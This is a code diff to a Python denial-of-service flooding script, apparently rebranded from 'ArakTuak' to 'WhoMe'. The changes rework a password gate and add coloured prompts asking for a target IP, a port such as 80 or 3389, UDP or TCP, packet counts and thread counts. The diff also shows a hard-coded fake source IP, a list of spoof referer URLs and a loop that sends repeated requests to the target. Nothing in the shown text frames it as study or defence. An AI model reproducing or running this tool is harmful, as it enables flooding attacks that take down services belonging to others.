@@ -172,44 +172,50 @@ referers = [
 'http://www.topsiteminecraft.com/site/pinterest.com/search?q=',
 'http://eu.battle.net/wow/en/search?q=']
 
+if os.name == 'nt':
+    os.system('title Password System Python')
+else:
+    sys.stdout.write("\x1b]2;Password System Python\x07")
 
-    print("")
-    print("Input PassWord")
-    print("")
-	
-	ifpasswd = "daniwibu"
-	
+os.system('cls' if os.name == 'nt' else 'clear')
+
+method1xx = "PassWord"
+ifpasswd = "test"
+
+if method1xx:
     for i in range(9999999999):
-        inputm1 = input(" ArakTuak/PWD > ")
+        inputm1 = input('\033[1;31;40m[Password] >\033[0m ')
         j=(9999999999)
         if inputm1==ifpasswd:
             print("")
-            print(" [+] Correct PassWord!")
+            print('\033[1;32;40mCorrect Password\033[0m')
             print("")
             break
         else:
+            os.system('cls' if os.name == 'nt' else 'clear')
             print("")
-            print(" [-] Wrong PassWord!")
+            print('\033[1;31;40mWrong Password, try again.\033[0m')
             print("")
             continue
 else:
     exit()
 
+time.sleep(3)
 
+os.system('cls' if os.name == 'nt' else 'clear')
 print("")
-print(" ** Welcome to ArakTuak tools! we hope you not abuse this tools..")
-print(" ** Last step to the DDoS Pane!!, GoodLuck!")
+print('\033[1;35;40mDont Leak This Tolls\033[0m')
 
 time.sleep(3)
 
 print("")
-name = str(input(" Input Name > "))
-ip = str(input(" Target IP > "))
-port = int(input(" Destination Port > "))
-method = str(input(" UDP or TCP > "))
-times = int(input(" Packets > "))
-threads = int(input(" Threads > "))
-fake_ip = '182.21.20.32'
+name = str(input('\033[1;33;40mInput Name > \033[0m'))
+ip = str(input('\033[1;33;40mTarget Ip > \033[0m'))
+port = int(input('\033[1;33;40mPort 80/3389 > \033[0m'))
+method = str(input('\033[1;33;40mUDP or TCP > \033[0m'))
+times = int(input('\033[1;33;40mPackets > \033[0m'))
+threads = int(input('\033[1;33;40mThreads > \033[0m'))
+fake_ip = '182.22.20.32'
 
 def my_bots():
 	global bots
@@ -325,7 +331,7 @@ def run():
                 s.send(str.encode(request))
                 s.sendall(str.encode(request))
                 s.sendall(str.encode(request))
-            print(f"ArakTuak Request send => {ip} With Port => {port}")
+            print(f"WhoMe Request send => {ip} With Port => {port}")
         except :
             print(f"Rush request send to {ip} With Port {port}")
             s.close()
